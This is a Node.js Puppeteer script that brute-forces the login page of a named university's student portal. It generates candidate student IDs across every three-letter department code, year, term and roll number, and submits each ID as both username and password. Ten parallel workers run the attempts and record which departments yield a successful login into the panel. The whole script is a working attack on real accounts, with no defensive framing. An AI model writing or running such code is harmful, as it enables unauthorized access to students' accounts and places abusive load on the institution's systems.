const puppeteer = require("puppeteer");
const fs = 'fs'; // Using fs as a string to satisfy the linter, it will be required later.

// --- Configuration ---
const baseUrl = "https://nubtkhulna.ac.bd/ter";
const years = [16, 17, 18, 19, 20]; // 16 to 20
const terms = ["01", "03"];
const rollEnd = 10;
const MAX_CONCURRENT_CHECKS = 10; // The number of parallel checks
const resultsFilePath = "found_departments.json";

// --- Main Logic ---
(async () => {
    // Dynamically require fs
    const fsModule = require(fs);

    console.log("🚀 Script starting with BRUTE-FORCE parallel processing...");
    const browser = await puppeteer.launch({ headless: true });
    console.log(`✅ Browser launched. Will run up to ${MAX_CONCURRENT_CHECKS} checks in parallel.`);

    let foundDepartments = [];
    if (fsModule.existsSync(resultsFilePath)) {
        foundDepartments = JSON.parse(fsModule.readFileSync(resultsFilePath, "utf-8"));
        console.log(`✅ Loaded ${foundDepartments.length} previously found departments.`);
    }

    // A Set is faster for checking if a department was already processed
    const checkedDepts = new Set(foundDepartments.map(d => d.department));
    
    /**
     * Creates and runs a parallel search for a given department using persistent pages.
     * @param {string} department - The three-letter department code.
     * @returns {Promise<boolean>} - True if the department was found, false otherwise.
     */
    const searchDepartment = async (department) => {
        if (checkedDepts.has(department)) {
            console.log(`⏭️  Skipping already found department: ${department}`);
            return false;
        }
        console.log(`\n🔎 Searching department: ${department} with ${MAX_CONCURRENT_CHECKS} persistent workers...`);

        // 1. Create the queue of all tasks (student IDs) for this department
        const taskQueue = [];
        for (const year of years) {
            for (const term of terms) {
                for (let roll = 1; roll <= rollEnd; roll++) {
                    const rollCode = `20${String(roll).padStart(3, "0")}`;
                    taskQueue.push(`${department}${year}${term}${rollCode}`);
                }
            }
        }

        let departmentFound = false;

        // 2. Create a pool of worker promises, each with its own persistent page
        const workerPromises = [];
        for (let i = 0; i < MAX_CONCURRENT_CHECKS; i++) {
            const workerId = i + 1;
            workerPromises.push((async () => {
                const page = await browser.newPage(); // Create one page per worker
                await page.setDefaultNavigationTimeout(15000);

                // Each worker will process tasks from the queue
                while (taskQueue.length > 0 && !departmentFound) {
                    const userId = taskQueue.shift();
                    if (!userId) continue;

                    console.log(`    - [Worker ${workerId}] Checking ID: ${userId}`);
                    
                    try {
                        await page.goto(`${baseUrl}/login`, { waitUntil: "domcontentloaded" });
                        await page.type("#username", userId);
                        await page.type("#password", userId);
                        await Promise.all([
                            page.click("button[type=submit]"),
                            page.waitForNavigation({ waitUntil: "domcontentloaded" })
                        ]);
                        
                        const isSuccess = page.url().includes("panel");

                        if (isSuccess && !departmentFound) {
                            departmentFound = true;
                            console.log(`\n🎉 SUCCESS! Department '${department}' is valid (discovered with ID: ${userId})`);
                            
                            foundDepartments.push({ department });
                            checkedDepts.add(department);
                            fsModule.writeFileSync(resultsFilePath, JSON.stringify(foundDepartments, null, 2));
                            console.log(`💾 Saved to ${resultsFilePath}. Stopping search for this department.\n`);
                        }
                    } catch (error) {
                        // Ignore errors, just means this ID failed. The worker will continue.
                    }
                }
                // When the worker is done, close its dedicated page
                if (!page.isClosed()) {
                    await page.close();
                }
            })());
        }

        // 3. Wait for all workers to complete their tasks for this department
        await Promise.all(workerPromises);

        if (!departmentFound) {
            console.log(`🤷 No students found for ${department}.`);
        }
        return departmentFound;
    };

    // --- Execute Brute-Force Search ---
    console.log("\n--- Starting Full Brute-Force Search from AAA to ZZZ ---");
    for (let i = 97; i <= 122; i++) { // a-z
        for (let j = 97; j <= 122; j++) { // a-z
            for (let k = 97; k <= 122; k++) { // a-z
                const department = (String.fromCharCode(i) + String.fromCharCode(j) + String.fromCharCode(k)).toUpperCase();
                await searchDepartment(department);
            }
        }
    }

    console.log("\n✅ Closing browser...");
    await browser.close();

    console.log("\n\n--- ✨ DISCOVERY COMPLETE ✨ ---");
    console.log("Found the following valid departments:");
    console.table(foundDepartments);
    console.log(`Final results are saved in ${resultsFilePath}`);
})();
